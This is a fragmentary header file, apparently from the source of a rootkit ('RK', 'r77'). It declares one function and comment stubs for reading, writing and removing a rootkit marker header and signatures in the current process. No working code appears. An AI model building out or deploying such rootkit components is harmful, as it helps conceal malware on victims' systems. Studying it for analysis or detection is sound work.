...
/// <summary>
/// Retrieves the RK header from the current process.
/// </summary>
/// <param name="detachAddress">If applicable, a pointer to a function pointer to write the detach address to.</param>
/// <returns>
/// The signature (R77_SIGNATURE, R77_SERVICE_SIGNATURE, or R77_HELPER_SIGNATURE) from the current process, or 0, if the current process does not have an RK header.
/// </returns>
WORD GetR77Header(LPVOID *detachAddress);
/// <summary>
/// Writes the RK header to the current process.
/// </summary>
...
/// <summary>
/// Removes the RK header from the current process.
/// </summary>
